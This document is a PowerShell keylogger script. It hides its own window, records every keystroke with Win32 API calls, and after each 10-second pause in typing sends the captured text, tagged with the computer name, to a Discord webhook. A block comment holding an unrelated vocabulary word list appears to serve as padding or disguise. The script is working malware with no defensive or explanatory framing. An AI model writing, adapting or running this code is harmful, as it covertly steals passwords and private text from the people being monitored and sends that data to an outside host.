$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'xxx'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

<#
Ablaze – On fire; brightly burning with intensity.

Banter – Playful, teasing talk between close friends.

Crisp – Firm, dry, and easily breakable texture.

Dapper – Stylish, neat man with elegant appearance.

Elicit – Draw out a response or reaction.

Fathom – Understand something deeply, often abstractly.

Glimpse – Quick, brief look without full details.

Havoc – Widespread destruction; total chaos and disorder.

Imbue – Fill or inspire with certain feelings.

Jovial – Cheerful, friendly, full of good humor.

Keen – Sharp, eager, or intellectually perceptive mind.

Lurk – Remain hidden, waiting to spring forth.

Mirth – Amusement expressed through laughter or cheerfulness.

Nimble – Quick and light in movement or action.

#>

$defs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

#region NativeMethods
/// <summary>
/// A collection of native method imports from user32.dll.
/// These are used to interact with low-level keyboard input functions.
/// </summary>
public static class NativeMethods
{
    /// <summary>
    /// Retrieves the state of a virtual key. Returns a short value indicating the key state.
    /// </summary>
    /// <param name="virtualKeyCode">The virtual key code.</param>
    /// <returns>A short indicating the key state.</returns>
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    /// <summary>
    /// Copies the status of the 256 virtual keys to the specified buffer.
    /// </summary>
    /// <param name="keystate">A 256-element array that receives the status data.</param>
    /// <returns>Nonzero if successful; otherwise, zero.</returns>
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    /// <summary>
    /// Maps a virtual key to a scan code or character value.
    /// </summary>
    /// <param name="uCode">The virtual key code.</param>
    /// <param name="uMapType">The translation to perform.</param>
    /// <returns>The translated value.</returns>
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    /// <summary>
    /// Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
    /// </summary>
    /// <param name="wVirtKey">The virtual key code.</param>
    /// <param name="wScanCode">The hardware scan code.</param>
    /// <param name="lpkeystate">An array with the status of each virtual key.</param>
    /// <param name="pwszBuff">A buffer that receives the translated Unicode character.</param>
    /// <param name="cchBuff">The size of the buffer (in characters).</param>
    /// <param name="wFlags">Behavior flags.</param>
    /// <returns>The number of characters written to the buffer.</returns>
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpkeystate,
        StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags
    );
}
#endregion
'@

$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

While ($true){
  $keyPressed = $false
    try{
      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
      # Start the loop with 30 ms delay between keystate check
      Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        # Get the key state. (is any key currently pressed)
        $keyst = $defs::GetAsyncKeyState($asc)
          # If a key is pressed
          if ($keyst -eq -32767) {
          # Restart the inactivity timer
          $keyPressed = $true
          $LastKeypressTime.Restart()
          $null = [console]::CapsLock
          # Translate the keycode to a letter
          $vtkey = $defs::MapVirtualKey($asc, 3)
          # Get the keyboard state and create stringbuilder
          $kbst = New-Object Byte[] 256
          $checkkbst = $defs::GetKeyboardState($kbst)
          $logchar = New-Object -TypeName System.Text.StringBuilder
            # Define the key that was pressed          
            if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
              # Check for non-character keys
              $LString = $logchar.ToString()
                if ($asc -eq 8) {$LString = "[BACK]"}
                if ($asc -eq 13) {$LString = "[ENT]"}
                if ($asc -eq 27) {$LString = "[ESC]"}
            # Add the key to sending variable
            $send += $LString 
            }
          }
        }
      }
    }
    finally{
      If ($keyPressed) {
      # Send the saved keys to a webhook
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
      #Remove log file and reset inactivity check 
      $send = ""
      $keyPressed = $false
      }
    }
  # reset stopwatch before restarting the loop
  $LastKeypressTime.Restart()
  Start-Sleep -Milliseconds 10
}
